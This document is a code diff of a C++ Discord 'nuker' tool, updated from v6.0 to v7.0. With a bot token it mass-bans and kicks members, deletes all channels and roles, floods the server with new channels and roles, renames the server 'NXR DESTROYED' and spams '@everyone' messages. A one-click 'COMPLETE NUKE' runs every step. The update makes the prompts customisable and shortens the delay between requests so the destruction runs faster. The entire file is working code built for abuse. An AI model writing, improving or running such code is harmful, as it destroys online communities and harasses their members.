@@ -2,25 +2,14 @@
 #include <wininet.h>
 #include <string>
 #include <vector>
-#include <thread>
 #include <iostream>
 #include <chrono>
 #include <random>
-#include <mutex>
+#include <thread>
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "ws2_32.lib")
 
 std::string g_token, g_guild;
-std::string g_credit = "NXR NUKER";
-std::string g_spam_msg = "@everyone NXR DESTROYED THIS SERVER";
-std::string g_new_server_name = "NXR DESTROYED";
-std::string g_channel_prefix = "nxr-";
-std::string g_role_prefix = "nxr-role-";
-int g_spam_count = 50;
-int g_create_channels = 30;
-int g_create_roles = 20;
-bool g_in_server = false;
-std::mutex log_mtx;
 std::mt19937 rng{std::random_device{}()};
 
 void set_color(int c) {
@@ -28,66 +17,54 @@ void set_color(int c) {
 }
 
 void log(const std::string& msg, int color = 12) {
-    std::lock_guard<std::mutex> lock(log_mtx);
     set_color(color);
     std::cout << msg << std::endl;
     set_color(7);
 }
 
 std::string http(const std::string& method, const std::string& endpoint, const std::string& body = "") {
-    std::string host = "discord.com";
-    std::string path = "/api/v10" + endpoint;
+    HINTERNET hInternet = InternetOpenA("NXR/7.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) return "";
 
-    HINTERNET hInternet = InternetOpenA("NXR/6.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!hInternet) return "ERROR_OPEN";
-
-    HINTERNET hConnect = InternetConnectA(hInternet, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT,
+    HINTERNET hConnect = InternetConnectA(hInternet, "discord.com", INTERNET_DEFAULT_HTTPS_PORT,
                                           NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-    if (!hConnect) {
-        InternetCloseHandle(hInternet);
-        return "ERROR_CONNECT";
-    }
+    if (!hConnect) { InternetCloseHandle(hInternet); return ""; }
 
     DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION;
+    std::string path = "/api/v10" + endpoint;
 
-    HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(),
-                                          "HTTP/1.1", NULL, NULL, flags, 0);
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, method.c_str(), path.c_str(), "HTTP/1.1", NULL, NULL, flags, 0);
     if (!hRequest) {
         InternetCloseHandle(hConnect);
         InternetCloseHandle(hInternet);
-        return "ERROR_REQUEST";
+        return "";
     }
 
-    std::string headers = "Authorization: Bot " + g_token + "\r\n"
-                          "Content-Type: application/json\r\n"
-                          "User-Agent: NXR-NUKER/6.0\r\n";
+    std::string headers = "Authorization: Bot " + g_token + "\r\nContent-Type: application/json\r\nUser-Agent: NXR-NUKER/7.0\r\n";
 
-    BOOL ok = FALSE;
-    if (!body.empty()) {
-        ok = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.size(),
-                              (LPVOID)body.c_str(), (DWORD)body.size());
-    } else {
+    BOOL ok;
+    if (!body.empty())
+        ok = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.size(), (LPVOID)body.c_str(), (DWORD)body.size());
+    else
         ok = HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.size(), NULL, 0);
-    }
 
-    std::string response;
+    std::string resp;
     if (ok) {
-        char buffer[4096];
+        char buf[8192];
         DWORD bytes = 0;
-        while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytes) && bytes > 0) {
-            buffer[bytes] = '\0';
-            response += buffer;
+        while (InternetReadFile(hRequest, buf, sizeof(buf)-1, &bytes) && bytes > 0) {
+            buf[bytes] = 0;
+            resp += buf;
         }
-    } else {
-        response = "SEND_FAILED";
     }
 
     InternetCloseHandle(hRequest);
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
 
-    std::this_thread::sleep_for(std::chrono::milliseconds(40 + (rng() % 60)));
-    return response;
+    // faster delay
+    std::this_thread::sleep_for(std::chrono::milliseconds(15 + (rng() % 25)));
+    return resp;
 }
 
 std::vector<std::string> get_ids(const std::string& json) {
@@ -109,74 +86,65 @@ std::string get_username(const std::string& json) {
     if (pos == std::string::npos) return "unknown";
     pos += 12;
     size_t end = json.find('"', pos);
-    if (end == std::string::npos) return "unknown";
-    return json.substr(pos, end - pos);
+    return (end == std::string::npos) ? "unknown" : json.substr(pos, end - pos);
 }
 
+void clear() { system("cls"); }
+
 void banner() {
-    system("cls");
+    clear();
     set_color(15);
     std::cout << R"(
- ███╗   ██╗██╗  ██╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
- ████╗  ██║╚██╗██╔╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
- ██╔██╗ ██║ ╚███╔╝ ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
- ██║╚██╗██║ ██╔██╗ ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
- ██║ ╚████║██╔╝ ██╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
- ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+    ███╗   ██╗██╗  ██╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
+    ████╗  ██║╚██╗██╔╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
+    ██╔██╗ ██║ ╚███╔╝ ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
+    ██║╚██╗██║ ██╔██╗ ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
+    ██║ ╚████║██╔╝ ██╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
+    ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 )" << std::endl;
     set_color(12);
-    std::cout << "                 NXR NUKER v6.0  |  STABLE FIXED\n";
-    std::cout << "                    All options working now\n\n";
+    std::cout << "\n                    NXR NUKER  v7.0  |  FULL CUSTOM\n";
+    std::cout << "                 Live input on every option + Faster\n\n";
     set_color(7);
 }
 
-void check_status() {
-    log("[i] Checking bot status...", 11);
-    std::string resp = http("GET", "/guilds/" + g_guild);
-    if (resp.find("\"id\"") != std::string::npos) {
-        g_in_server = true;
-        log("[+] Bot is in the server", 10);
-    } else {
-        g_in_server = false;
-        log("[!] Bot NOT in server or invalid token/guild", 12);
-        log("[debug] " + resp.substr(0, 150), 8);
-    }
-}
-
 void ban_members() {
-    log("[i] Fetching members for ban...", 11);
+    std::string reason;
+    std::cout << "Ban reason (example: NXR NUKER): ";
+    std::getline(std::cin, reason);
+    if (reason.empty()) reason = "NXR NUKER";
+
+    log("[i] Fetching members...", 11);
     std::vector<std::string> members;
     std::string after = "0";
-    for (int i = 0; i < 100; ++i) {
+    for (int i = 0; i < 150; ++i) {
         std::string resp = http("GET", "/guilds/" + g_guild + "/members?limit=100&after=" + after);
         auto ids = get_ids(resp);
         if (ids.empty()) break;
         members.insert(members.end(), ids.begin(), ids.end());
         after = ids.back();
-        log("[i] Loaded " + std::to_string(members.size()) + " members", 11);
+        std::cout << "\r[i] Loaded " << members.size() << " members" << std::flush;
         if (ids.size() < 100) break;
     }
+    std::cout << std::endl;
 
-    log("[!] Starting ban on " + std::to_string(members.size()) + " members", 12);
+    log("[!] Banning " + std::to_string(members.size()) + " members...", 12);
     for (size_t i = 0; i < members.size(); ++i) {
         std::string uid = members[i];
         std::string info = http("GET", "/users/" + uid);
         std::string name = get_username(info);
-        std::string body = "{\"delete_message_days\":7,\"reason\":\"" + g_credit + "\"}";
-        std::string res = http("PUT", "/guilds/" + g_guild + "/bans/" + uid, body);
-        log("[+] BANNED " + name + " (" + uid + ")", 10);
-        if ((i + 1) % 10 == 0) {
-            log("[i] Progress: " + std::to_string(i + 1) + "/" + std::to_string(members.size()), 11);
-        }
+        std::string body = "{\"delete_message_days\":7,\"reason\":\"" + reason + "\"}";
+        http("PUT", "/guilds/" + g_guild + "/bans/" + uid, body);
+        log("[+] BANNED " + name + " | " + uid, 10);
     }
-    log("[+] Ban finished", 10);
+    log("[+] Ban complete", 10);
 }
 
 void kick_members() {
-    log("[i] Fetching members for kick...", 11);
+    log("[i] Fetching members...", 11);
     std::vector<std::string> members;
     std::string after = "0";
-    for (int i = 0; i < 100; ++i) {
+    for (int i = 0; i < 150; ++i) {
         std::string resp = http("GET", "/guilds/" + g_guild + "/members?limit=100&after=" + after);
         auto ids = get_ids(resp);
         if (ids.empty()) break;
@@ -184,25 +152,24 @@ void kick_members() {
         after = ids.back();
         if (ids.size() < 100) break;
     }
-
-    log("[!] Kicking " + std::to_string(members.size()) + " members", 12);
+    log("[!] Kicking " + std::to_string(members.size()) + " members...", 12);
     for (auto& uid : members) {
         http("DELETE", "/guilds/" + g_guild + "/members/" + uid);
         log("[+] KICKED " + uid, 10);
     }
-    log("[+] Kick finished", 10);
+    log("[+] Kick complete", 10);
 }
 
 void delete_channels() {
     log("[i] Fetching channels...", 11);
     std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
     auto channels = get_ids(resp);
-    log("[!] Deleting " + std::to_string(channels.size()) + " channels", 12);
+    log("[!] Deleting " + std::to_string(channels.size()) + " channels...", 12);
     for (auto& id : channels) {
         http("DELETE", "/channels/" + id);
-        log("[+] Deleted channel " + id, 10);
+        log("[+] Deleted " + id, 10);
     }
-    log("[+] Channels deleted", 10);
+    log("[+] All channels deleted", 10);
 }
 
 void delete_roles() {
@@ -217,93 +184,94 @@ void delete_roles() {
     log("[+] Roles deleted", 10);
 }
 
-void delete_emojis() {
-    log("[i] Fetching emojis...", 11);
-    std::string resp = http("GET", "/guilds/" + g_guild + "/emojis");
-    auto emojis = get_ids(resp);
-    for (auto& id : emojis) {
-        http("DELETE", "/guilds/" + g_guild + "/emojis/" + id);
-        log("[+] Deleted emoji " + id, 10);
-    }
-    log("[+] Emojis deleted", 10);
-}
-
 void create_channels() {
-    log("[i] Creating " + std::to_string(g_create_channels) + " channels...", 11);
-    for (int i = 0; i < g_create_channels; ++i) {
-        std::string body = "{\"name\":\"" + g_channel_prefix + std::to_string(i) + "\",\"type\":0}";
+    std::string prefix;
+    int count = 0;
+    std::cout << "Channel name prefix (example: nxr-nuke): ";
+    std::getline(std::cin, prefix);
+    if (prefix.empty()) prefix = "nxr-";
+    std::cout << "How many channels to create: ";
+    std::cin >> count;
+    std::cin.ignore();
+
+    log("[!] Creating " + std::to_string(count) + " channels...", 12);
+    for (int i = 0; i < count; ++i) {
+        std::string body = "{\"name\":\"" + prefix + std::to_string(i) + "\",\"type\":0}";
         http("POST", "/guilds/" + g_guild + "/channels", body);
-        log("[+] Created " + g_channel_prefix + std::to_string(i), 10);
+        log("[+] Created " + prefix + std::to_string(i), 10);
     }
+    log("[+] Channel creation done", 10);
 }
 
 void create_roles() {
-    log("[i] Creating " + std::to_string(g_create_roles) + " roles...", 11);
-    for (int i = 0; i < g_create_roles; ++i) {
-        std::string body = "{\"name\":\"" + g_role_prefix + std::to_string(i) + "\",\"color\":16711680}";
+    std::string prefix;
+    int count = 0;
+    std::cout << "Role name prefix (example: NXR-ROLE): ";
+    std::getline(std::cin, prefix);
+    if (prefix.empty()) prefix = "NXR-";
+    std::cout << "How many roles to create: ";
+    std::cin >> count;
+    std::cin.ignore();
+
+    log("[!] Creating " + std::to_string(count) + " roles...", 12);
+    for (int i = 0; i < count; ++i) {
+        std::string body = "{\"name\":\"" + prefix + std::to_string(i) + "\",\"color\":16711680}";
         http("POST", "/guilds/" + g_guild + "/roles", body);
-        log("[+] Created role " + g_role_prefix + std::to_string(i), 10);
+        log("[+] Created role " + prefix + std::to_string(i), 10);
     }
+    log("[+] Role creation done", 10);
 }
 
 void rename_server() {
-    log("[i] Renaming server...", 11);
-    std::string body = "{\"name\":\"" + g_new_server_name + "\"}";
+    std::string newname;
+    std::cout << "New server name: ";
+    std::getline(std::cin, newname);
+    if (newname.empty()) newname = "NXR DESTROYED";
+
+    std::string body = "{\"name\":\"" + newname + "\"}";
     http("PATCH", "/guilds/" + g_guild, body);
-    log("[+] Server renamed to " + g_new_server_name, 10);
+    log("[+] Server renamed to: " + newname, 10);
 }
 
 void spam_channels() {
-    log("[i] Fetching channels for spam...", 11);
+    std::string msg;
+    int count = 0;
+    std::cout << "Spam message (type what you want): ";
+    std::getline(std::cin, msg);
+    if (msg.empty()) msg = "@everyone NXR NUKED";
+    std::cout << "How many messages per channel: ";
+    std::cin >> count;
+    std::cin.ignore();
+
+    log("[i] Fetching channels...", 11);
     std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
     auto channels = get_ids(resp);
-    log("[!] Spamming " + std::to_string(channels.size()) + " channels x" + std::to_string(g_spam_count), 12);
+
+    log("[!] Spamming " + std::to_string(channels.size()) + " channels x" + std::to_string(count), 12);
     for (auto& ch : channels) {
-        for (int i = 0; i < g_spam_count; ++i) {
-            std::string body = "{\"content\":\"" + g_spam_msg + " | " + g_credit + "\"}";
+        for (int i = 0; i < count; ++i) {
+            std::string body = "{\"content\":\"" + msg + "\"}";
             http("POST", "/channels/" + ch + "/messages", body);
         }
-        log("[+] Spam finished on channel " + ch, 10);
+        log("[+] Spam done on " + ch, 10);
     }
-    log("[+] All spam done", 10);
+    log("[+] All spam finished", 10);
 }
 
 void complete_nuke() {
-    log("[!] ========== COMPLETE NUKE ==========", 12);
+    log("[!] COMPLETE NUKE STARTED", 12);
     rename_server();
     delete_channels();
     delete_roles();
-    delete_emojis();
     create_channels();
     create_roles();
     ban_members();
     spam_channels();
-    log("[!] ========== NUKE FINISHED ==========", 10);
-}
-
-void customize() {
-    std::cin.ignore();
-    std::cout << "New credit text: ";
-    std::getline(std::cin, g_credit);
-    std::cout << "New spam message: ";
-    std::getline(std::cin, g_spam_msg);
-    std::cout << "New server name: ";
-    std::getline(std::cin, g_new_server_name);
-    std::cout << "Channel prefix: ";
-    std::getline(std::cin, g_channel_prefix);
-    std::cout << "Role prefix: ";
-    std::getline(std::cin, g_role_prefix);
-    std::cout << "Spam count per channel: ";
-    std::cin >> g_spam_count;
-    std::cout << "Channels to create: ";
-    std::cin >> g_create_channels;
-    std::cout << "Roles to create: ";
-    std::cin >> g_create_roles;
-    log("[+] Settings updated", 10);
+    log("[!] COMPLETE NUKE FINISHED", 10);
 }
 
 int main() {
-    SetConsoleTitleA("NXR NUKER v6.0 STABLE");
+    SetConsoleTitleA("NXR NUKER v7.0 - FULL CUSTOM LIVE INPUT");
     system("color 0C");
 
     banner();
@@ -314,50 +282,48 @@ int main() {
     std::getline(std::cin, g_guild);
     set_color(7);
 
-    check_status();
+    // quick check
+    std::string test = http("GET", "/guilds/" + g_guild);
+    if (test.find("\"id\"") != std::string::npos)
+        log("[+] Bot is in the server", 10);
+    else
+        log("[!] Bot NOT in server / check token & guild ID", 12);
 
     while (true) {
         banner();
         set_color(12);
-        std::cout << "Status: " << (g_in_server ? "In Server" : "NOT in server") << "\n\n";
-        std::cout << " (1) Ban Members\n";
-        std::cout << " (2) Kick Members\n";
-        std::cout << " (3) Delete Channels\n";
-        std::cout << " (4) Delete Roles\n";
-        std::cout << " (5) Delete Emojis\n";
-        std::cout << " (6) Create Channels\n";
-        std::cout << " (7) Create Roles\n";
-        std::cout << " (8) Rename Server\n";
-        std::cout << " (9) Spam Channels\n";
-        std::cout << "(10) Complete Nuke\n";
-        std::cout << "(11) Customize Settings\n";
-        std::cout << "(12) Re-check Status\n";
-        std::cout << " (0) Exit\n";
+        std::cout << "  (1) Ban Members          (live reason)\n";
+        std::cout << "  (2) Kick Members\n";
+        std::cout << "  (3) Delete All Channels\n";
+        std::cout << "  (4) Delete All Roles\n";
+        std::cout << "  (5) Create Channels      (live name + count)\n";
+        std::cout << "  (6) Create Roles         (live name + count)\n";
+        std::cout << "  (7) Rename Server        (live name)\n";
+        std::cout << "  (8) Spam All Channels    (live message + count)\n";
+        std::cout << "  (9) COMPLETE NUKE\n";
+        std::cout << "  (0) Exit\n";
         set_color(7);
         std::cout << "\nSelect option: ";
 
         int choice;
         std::cin >> choice;
+        std::cin.ignore();   // important
 
         switch (choice) {
             case 1: ban_members(); break;
             case 2: kick_members(); break;
             case 3: delete_channels(); break;
             case 4: delete_roles(); break;
-            case 5: delete_emojis(); break;
-            case 6: create_channels(); break;
-            case 7: create_roles(); break;
-            case 8: rename_server(); break;
-            case 9: spam_channels(); break;
-            case 10: complete_nuke(); break;
-            case 11: customize(); break;
-            case 12: check_status(); break;
+            case 5: create_channels(); break;
+            case 6: create_roles(); break;
+            case 7: rename_server(); break;
+            case 8: spam_channels(); break;
+            case 9: complete_nuke(); break;
             case 0: return 0;
             default: log("Invalid option", 12);
         }
 
         std::cout << "\nPress Enter to return to menu...";
-        std::cin.ignore();
         std::cin.get();
     }
     return 0;
